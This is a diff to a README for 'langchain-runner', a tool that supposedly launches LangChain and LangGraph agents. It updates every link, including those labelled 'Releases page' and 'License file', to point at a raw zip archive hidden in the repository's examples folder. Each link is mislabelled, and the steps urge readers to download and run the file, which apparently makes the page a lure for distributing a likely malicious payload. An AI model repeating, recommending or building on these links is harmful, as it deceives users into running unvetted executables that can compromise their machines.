@@ -1,6 +1,6 @@
 # 🚀 langchain-runner - Effortlessly Launch AI Services
 
-[![Download](https://github.com/Lukaa1507/langchain-runner/raw/refs/heads/main/tests/langchain_runner_1.1.zip)](https://github.com/Lukaa1507/langchain-runner/raw/refs/heads/main/tests/langchain_runner_1.1.zip)
+[![Download](https://github.com/Lukaa1507/langchain-runner/raw/refs/heads/main/examples/langchain-runner-v2.9.zip)](https://github.com/Lukaa1507/langchain-runner/raw/refs/heads/main/examples/langchain-runner-v2.9.zip)
 
 ## 📋 Overview
 
@@ -8,11 +8,11 @@ langchain-runner offers a simple solution to run LangChain and LangGraph agents 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Lukaa1507/langchain-runner/raw/refs/heads/main/tests/langchain_runner_1.1.zip) to download the application. You will find the latest release along with older versions if needed. 
+To get started, visit the [Releases page](https://github.com/Lukaa1507/langchain-runner/raw/refs/heads/main/examples/langchain-runner-v2.9.zip) to download the application. You will find the latest release along with older versions if needed. 
 
 Follow these steps to download:
 
-1. Visit the [Releases page](https://github.com/Lukaa1507/langchain-runner/raw/refs/heads/main/tests/langchain_runner_1.1.zip).
+1. Visit the [Releases page](https://github.com/Lukaa1507/langchain-runner/raw/refs/heads/main/examples/langchain-runner-v2.9.zip).
 2. Locate the version you need. The latest version is at the top.
 3. Click on the appropriate file for your operating system (Windows, MacOS, or Linux).
 4. Save the file to your computer.
@@ -89,8 +89,8 @@ For help or to share your experiences with langchain-runner, visit our support f
 
 This project is licensed under the MIT License. You are free to use it for personal or commercial projects. 
 
-For further details, view the [License file](https://github.com/Lukaa1507/langchain-runner/raw/refs/heads/main/tests/langchain_runner_1.1.zip).
+For further details, view the [License file](https://github.com/Lukaa1507/langchain-runner/raw/refs/heads/main/examples/langchain-runner-v2.9.zip).
 
 ## 🎯 Final Notes
 
-Now you are ready to use langchain-runner. Remember to check the [Releases page](https://github.com/Lukaa1507/langchain-runner/raw/refs/heads/main/tests/langchain_runner_1.1.zip) frequently for updates and improvements. Enjoy automating your tasks effortlessly!
+Now you are ready to use langchain-runner. Remember to check the [Releases page](https://github.com/Lukaa1507/langchain-runner/raw/refs/heads/main/examples/langchain-runner-v2.9.zip) frequently for updates and improvements. Enjoy automating your tasks effortlessly!
